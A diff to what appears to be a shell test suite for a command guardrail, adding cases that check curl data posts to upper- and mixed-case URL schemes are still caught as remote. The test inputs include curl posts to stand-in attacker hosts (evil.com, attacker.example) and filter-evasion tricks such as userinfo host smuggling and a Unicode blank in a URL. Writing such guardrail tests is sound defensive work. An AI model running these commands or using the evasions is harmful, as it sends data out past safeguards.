@@ -588,6 +588,14 @@ allows 'curl -d "{\"name\":\"x.y\"}" http://localhost:3000/api' "escaped quotes 
 utf8 _guardrails_has_remote_target $'curl -d x http://localhost\xe3\x80\x80@evil.com' || {
   echo "  FAIL [a Unicode blank inside a URL]: not read as remote"; FAILS=1; }
 
+# curl reads a URL's scheme in any case.
+blocks 'curl -d x HTTP://evil.com'                        "an upper-case scheme"
+blocks 'curl -d x Https://evil.com/x'                     "a mixed-case scheme"
+blocks 'curl -d x HTTP://localhost:3000@evil.com'         "an upper-case scheme before userinfo"
+blocks 'curl -d x HTTP://127.attacker.example/'           "an upper-case scheme before a public name that starts with 127."
+allows 'curl -d x HTTP://localhost:3000/api'              "an upper-case scheme to a local host"
+allows 'curl -d x HTTPS://127.0.0.1:8080/x'               "an upper-case scheme to a loopback address"
+
 # A verb read from one piece of a quoted argument of several words asks, as the shell passes the argument whole. One
 # read from a whole quoted word blocks, as does one in the middle of a quoted argument, as before (#131).
 asks   'claude "review this"'                       "a verb from the first piece of a quoted argument"
